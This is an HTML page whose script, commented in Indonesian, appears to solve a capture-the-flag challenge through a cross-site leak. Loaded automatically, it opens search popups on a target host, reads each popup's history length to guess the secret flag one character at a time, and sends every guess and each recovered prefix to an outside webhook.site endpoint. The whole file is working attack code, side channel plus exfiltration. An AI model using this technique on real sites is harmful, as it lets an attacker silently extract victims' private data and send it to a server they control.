<!DOCTYPE html>
<html>
<body>
    <script>
        // Gunakan http:// untuk menghindari masalah SSL Error
        const targetBase = "http://ponder.cbd2026.cloud/search?q=";
        const webhook = "https://webhook.site/76c1a3f4-7985-4c73-9f7d-1d28bae13e25"; 
        let flag = "flag{"; // Titik mulai pencarian
        const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";

        async function tryChar(char) {
            return new Promise((resolve) => {
                const query = flag + char;
                const win = window.open(`${targetBase}${encodeURIComponent(query)}`);

                // Tunggu 2 detik agar redirect 1 detik di target selesai dilakukan
                setTimeout(() => {
                    if (!win) {
                        fetch(`${webhook}?error=popup_blocked`);
                        resolve(false);
                        return;
                    }

                    const hLen = win.history.length;
                    win.close();
                    
                    // Log percobaan untuk memantau progres bot
                    fetch(`${webhook}?char=${char}&h=${hLen}`);

                    // Jika hLen > 1, berarti terjadi redirect (karakter benar!)
                    if (hLen > 1) {
                        resolve(true);
                    } else {
                        resolve(false);
                    }
                }, 2000); 
            });
        }

        async function start() {
            // Sinyal awal ke webhook
            fetch(`${webhook}?status=STARTING_ATTACK_ON_${flag}`);

            for (let char of alphabet) {
                if (await tryChar(char)) {
                    flag += char;
                    // Kirim progres flag ke webhook
                    fetch(`${webhook}?FOUND_NEW_FLAG=${encodeURIComponent(flag)}`);
                    
                    if (char === "}") return; // Selesai
                    return start(); // Cari karakter selanjutnya (rekursi)
                }
            }
        }

        window.onload = start;
    </script>
</body>
</html>
